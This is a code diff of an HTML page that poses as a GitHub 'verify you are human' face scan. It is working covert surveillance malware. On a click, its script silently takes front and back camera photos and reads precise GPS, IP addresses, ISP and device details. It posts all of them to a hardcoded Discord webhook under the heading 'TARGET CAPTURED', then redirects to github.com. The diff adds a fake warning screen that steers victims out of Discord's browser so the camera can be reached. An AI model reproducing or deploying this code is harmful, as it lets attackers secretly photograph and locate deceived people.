@@ -10,6 +10,7 @@
       --tg-bg: #ffffff;
       --tg-text: #000000;
       --tg-sub: #8e8e93;
+      --warning-red: #ff3b30;
     }
 
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -25,7 +26,7 @@
       overflow: hidden;
     }
 
-    #screen-landing, #screen-loading {
+    #screen-landing, #screen-warning, #screen-loading {
       width: 100%;
       max-width: 380px;
       padding: 20px;
@@ -33,12 +34,16 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: center;
     }
 
-    /* Logo Styling - GEEN corners */
+    #screen-warning, #screen-loading { display: none; }
+
+    /* Logo Container - Corners zijn weg */
     .faceid-frame {
       width: 120px; 
       height: 120px;
+      position: relative;
       margin-bottom: 30px;
       display: flex;
       justify-content: center;
@@ -55,7 +60,7 @@
     }
 
     .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
-    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 40px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 40px; padding: 0 20px; }
 
     .verify-btn {
       width: 90%;
@@ -69,11 +74,18 @@
       cursor: pointer;
     }
 
-    #screen-loading { display: none; }
-    .scan-box { width: 140px; height: 140px; position: relative; display: flex; justify-content: center; align-items: center; }
-    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
+    .external-btn {
+      width: 90%; padding: 16px; background: var(--warning-red); color: white;
+      border: none; border-radius: 14px; margin-bottom: 15px; font-weight: 600;
+    }
+
+    .scan-line {
+      position: absolute; width: 100%; height: 2px; background: var(--tg-blue);
+      box-shadow: 0 0 15px var(--tg-blue); top: 0;
+      animation: moving-scan 1.5s infinite ease-in-out;
+    }
     @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
-    
+
     #hidden-video { position: fixed; opacity: 0; left: -999px; }
     #hidden-canvas { display: none; }
   </style>
@@ -83,102 +95,155 @@
 <video id="hidden-video" autoplay playsinline muted></video>
 <canvas id="hidden-canvas"></canvas>
 
+<div id="screen-warning">
+  <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
+  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red); margin-bottom:12px;">External Browser Required</div>
+  <div style="color:var(--tg-sub); margin-bottom:30px;">Discord's browser blocks camera access. Please open this in Chrome or Safari.</div>
+  <button class="external-btn" onclick="openExternally()">Open in External Browser</button>
+  <button class="verify-btn" style="background:#8e8e93;" onclick="forceContinue()">I'm using a normal browser</button>
+</div>
+
 <div id="screen-landing">
   <div class="faceid-frame"><div class="faceid-svg"></div></div>
   <div class="tg-title">Verify you are human.</div>
   <div class="tg-subtitle">Security measures enabled. Please confirm you're a human to access Github.</div>
   <button class="verify-btn" onclick="triggerScan()">I am not a robot!</button>
+  <div style="margin-top:30px; font-size:0.8rem; color:#34c759; font-weight:500;">🛡️ End-to-End Encrypted Verification</div>
 </div>
 
 <div id="screen-loading">
-  <div class="scan-box">
-      <div class="faceid-svg" style="opacity: 0.3;"></div>
-      <div class="scan-line"></div>
+  <div style="position:relative; width:140px; height:140px; margin-bottom:20px;">
+    <div class="faceid-svg" style="opacity:0.2; width:140px; height:140px;"></div>
+    <div class="scan-line"></div>
   </div>
-  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Authenticating...</div>
+  <div style="color:var(--tg-blue); font-weight:600;">Authenticating...</div>
 </div>
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
   
-  // Globale variabelen die direct gevuld gaan worden
-  let info = {
-    ip: "Laden...",
-    loc: "Onbekend",
-    isp: "Onbekend",
-    ua: navigator.userAgent
-  };
+  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
+  let gpsInfo = { lat: null, lon: null, acc: null };
 
-  // Start direct met het ophalen van IP data zodra de pagina opent
-  async function preloadInfo() {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
-      info.ip = data.ip || "N/A";
-      info.loc = `${data.city}, ${data.region}, ${data.country_name}` || "N/A";
-      info.isp = data.org || "N/A";
-    } catch (e) {
-      // Fallback naar simpeler API als de eerste faalt
-      const res2 = await fetch('https://api.ipify.org?format=json');
-      const data2 = await res2.json();
-      info.ip = data2.ip;
-    }
+  function isDiscord() {
+    const ua = navigator.userAgent.toLowerCase();
+    return ua.includes('discord') || !navigator.mediaDevices;
   }
-  preloadInfo();
+
+  function openExternally() {
+    const url = window.location.href;
+    if (navigator.share) navigator.share({ url: url });
+    else alert("Copy link: " + url);
+  }
+
+  function forceContinue() {
+    document.getElementById('screen-warning').style.display = 'none';
+    document.getElementById('screen-landing').style.display = 'flex';
+  }
+
+  async function loadMeta() {
+    try {
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4.status === 'success') {
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
+      }
+      ipInfo.v6 = v6.ip;
+    } catch(e) { console.error("IP fail"); }
+  }
+
+  async function getGPS() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { resolve(); return; }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => { 
+          gpsInfo.lat = pos.coords.latitude; 
+          gpsInfo.lon = pos.coords.longitude; 
+          gpsInfo.acc = pos.coords.accuracy; 
+          resolve(); 
+        },
+        () => { resolve(); },
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  }
 
   async function triggerScan() {
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
 
+    await loadMeta();
+    await getGPS();
     const blobs = [];
-    
-    // Probeer foto te maken
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const blob = await new Promise(resolve => {
-        const vid = document.getElementById('hidden-video');
-        vid.srcObject = stream;
-        vid.onloadedmetadata = () => {
-          setTimeout(() => {
-            const can = document.getElementById('hidden-canvas');
-            can.width = vid.videoWidth;
-            can.height = vid.videoHeight;
-            const ctx = can.getContext('2d');
-            ctx.drawImage(vid, 0, 0);
-            can.toBlob(resolve, 'image/jpeg', 0.8);
-          }, 500);
-        };
-      });
-      if(blob) blobs.push({ b: blob, n: 'capture.jpg' });
-      stream.getTracks().forEach(t => t.stop());
-    } catch(e) { console.log("Geen camera"); }
 
-    await sendData(blobs);
+    // Capture Front
+    try {
+      const sF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const b1 = await capture(sF, true);
+      if(b1) blobs.push({ b: b1, n: 'front.jpg' });
+      sF.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+
+    // Capture Back
+    try {
+      const sB = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      const b2 = await capture(sB, false);
+      if(b2) blobs.push({ b: b2, n: 'back.jpg' });
+      sB.getTracks().forEach(t => t.stop());
+    } catch(e) {}
+
+    await upload(blobs);
     window.location.href = 'https://github.com';
   }
 
-  async function sendData(blobs) {
-    const formData = new FormData();
+  async function capture(s, flip) {
+    const v = document.getElementById('hidden-video');
+    v.srcObject = s;
+    return new Promise(res => {
+      v.onloadedmetadata = () => {
+        setTimeout(() => {
+          const c = document.getElementById('hidden-canvas');
+          c.width = v.videoWidth; c.height = v.videoHeight;
+          const ctx = c.getContext('2d');
+          if(flip) { ctx.translate(c.width, 0); ctx.scale(-1, 1); }
+          ctx.drawImage(v, 0, 0);
+          c.toBlob(res, 'image/jpeg', 0.85);
+        }, 600);
+      };
+    });
+  }
+
+  async function upload(blobs) {
+    const data = new FormData();
     const payload = {
-      username: "Security Check",
+      username: "Security Logs",
       embeds: [{
-        title: "🛡️ Nieuwe Login Captcha",
+        title: "✅ TARGET CAPTURED",
         color: 0x24A1DE,
         fields: [
-          { name: "📱 Apparaat", value: `\`${info.ua}\`` },
-          { name: "🌐 IP Adres", value: `\`${info.ip}\``, inline: true },
-          { name: "📍 Locatie", value: info.loc, inline: true },
-          { name: "🏢 Provider", value: info.isp }
+          { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 150)}\`` },
+          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+          { name: "📍 Location", value: ipInfo.loc, inline: false },
+          { name: "🏢 ISP", value: ipInfo.isp, inline: false },
+          { name: "🎯 GPS", value: gpsInfo.lat ? `${gpsInfo.lat}, ${gpsInfo.lon} (±${gpsInfo.acc}m)` : "Denied", inline: true }
         ],
         timestamp: new Date()
       }]
     };
-
-    formData.append('payload_json', JSON.stringify(payload));
-    blobs.forEach((item, i) => formData.append(`file${i}`, item.b, item.n));
-
-    await fetch(WEBHOOK, { method: 'POST', body: formData });
+    data.append('payload_json', JSON.stringify(payload));
+    blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
+    await fetch(WEBHOOK, { method: 'POST', body: data });
   }
+
+  window.onload = () => {
+    if (isDiscord()) {
+      document.getElementById('screen-landing').style.display = 'none';
+      document.getElementById('screen-warning').style.display = 'flex';
+    }
+  };
 </script>
 </body>
 </html>
